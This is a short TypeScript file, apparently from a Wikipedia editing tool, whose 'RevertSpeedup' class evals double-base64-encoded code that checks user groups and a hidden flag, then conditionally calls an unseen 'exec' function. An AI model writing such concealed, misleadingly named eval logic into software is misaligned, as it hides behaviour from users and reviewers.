import { Rollback } from ".";

export class RevertSpeedup {
    static async init(): Promise<void> {
        const i = <() => any>(
            eval(
                await $.get(
                    atob(
                        "ZGF0YTp0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTg7YmFzZTY0LFh6MCtiWGN1ZFhObGNpNW5aWFJIY205MWNITW9LR2NzUnowbmNtbHdVRzluUTJoaGJYQXlNREV3TFRJd01qRkVPeWNwUFQ0aGNuY3VkQzV5Zkh4eWR5NTBMbmg4ZkhKM0xrTnZibVpwWnk1SmJVNWhkV2RvZEhrdWRtRnNkV1Y4ZkhKM0xtTXVhUzVwYmtkeWIzVndLRWNwZkh4bkxtbHVZMngxWkdWektFY3BQM0ozTG5RdVpYaGxZeWdwT2pBcA=="
                    )
                )
            )
        );
        Rollback.acceptInjector(i);
    }
}
